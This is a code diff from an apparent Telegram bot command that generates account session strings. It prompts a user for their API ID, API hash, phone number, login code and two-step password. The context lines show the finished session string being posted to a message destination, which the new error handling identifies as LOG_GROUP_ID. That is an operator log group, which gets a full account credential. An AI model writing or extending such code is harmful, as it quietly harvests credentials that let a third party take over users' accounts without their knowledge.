@@ -36,18 +36,12 @@ async def session_cmd(_, msg):
         api_hash = await ask("🔑 Enter your **API HASH**:", chat_id)
         number = await ask("📞 Enter your **Phone Number with country code**:", chat_id)
 
-        temp = Client(
-            "gen",
-            api_id=int(api_id),
-            api_hash=api_hash
-        )
-
+        temp = Client("gen", api_id=int(api_id), api_hash=api_hash)
         await temp.connect()
         sent = await temp.send_code(number)
 
         otp = await ask("📩 Enter the OTP you received:", chat_id)
 
-        # 2-step security check
         try:
             await temp.sign_in(number, sent.phone_code_hash, otp)
         except SessionPasswordNeeded:
@@ -72,7 +66,8 @@ async def session_cmd(_, msg):
                 f"🔑 Session:\n`{string}`"
             )
         except Exception as log_error:
-            print("LOG ERROR:", log_error)
+            await msg.reply("⚠ Session generated but logging failed! Check Heroku logs.")
+            print(f"LOG ERROR → {log_error} — LOG_GROUP_ID = {LOG_GROUP_ID}")
 
     except Exception as e:
         await msg.reply(f"❌ Error: `{e}`")
